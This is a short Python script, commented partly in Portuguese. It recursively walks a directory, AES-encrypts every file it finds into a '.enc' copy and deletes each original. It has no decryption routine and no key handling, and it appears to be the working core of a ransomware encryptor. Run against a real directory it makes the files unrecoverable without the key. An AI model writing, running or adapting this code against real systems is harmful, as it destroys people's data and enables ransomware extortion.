import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_file(file_path, key):
    """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
    cipher = AES.new(key, AES.MODE_CBC)

    with open(file_path, "rb") as f:
        data = f.read()

    encrypted_data = cipher.encrypt(pad(data, AES.block_size))

    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as f:
        f.write(cipher.iv)
        f.write(encrypted_data)

    print(f"Cryptograf: {encrypted_file_path}")
    os.remove(file_path)
    return encrypted_file_path


def scan_and_encrypt(directory, key):
    """Scan a directory and process each file."""
    print(f"Scanning directory: {directory}")
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                print(f"Error processing {file_path}: {e}")

